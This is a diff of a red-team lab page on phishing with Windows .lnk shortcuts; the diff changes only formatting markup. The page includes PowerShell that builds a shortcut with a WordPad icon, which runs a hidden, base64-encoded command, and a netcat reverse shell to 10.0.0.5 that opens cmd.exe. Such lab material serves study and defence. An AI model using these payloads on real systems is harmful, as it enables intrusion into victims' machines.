@@ -10,8 +10,7 @@ This lab explores a popular phishing technique where attackers embed .lnk files 
 
 Creating an .LNK file that will trigger the payload once executed:
 
-{% tabs %}
-{% tab title="attacker@local" %}
+{% code title="attacker@local" %}
 ```csharp
 $command = 'Start-Process c:\shell.cmd'
 $bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
@@ -25,18 +24,15 @@ $link.iconlocation = "C:\Program Files\Windows NT\Accessories\wordpad.exe"
 $link.arguments = "-Nop -sta -noni -w hidden -encodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgAGMAOgBcAHMAaABlAGwAbAAuAGMAbQBkAA=="
 $link.save()
 ```
-{% endtab %}
-{% endtabs %}
+{% endcode %}
 
 Powershell payload will trigger a rudimentary NC reverse shell:
 
-{% tabs %}
-{% tab title="c:\\shell.cmd" %}
+{% code title="c:\\shell.cmd" %}
 ```csharp
 C:\tools\nc.exe 10.0.0.5 443 -e cmd.exe
 ```
-{% endtab %}
-{% endtabs %}
+{% endcode %}
 
 Once the above powershell script is executed, an `.LNK` shortcut is created:
 
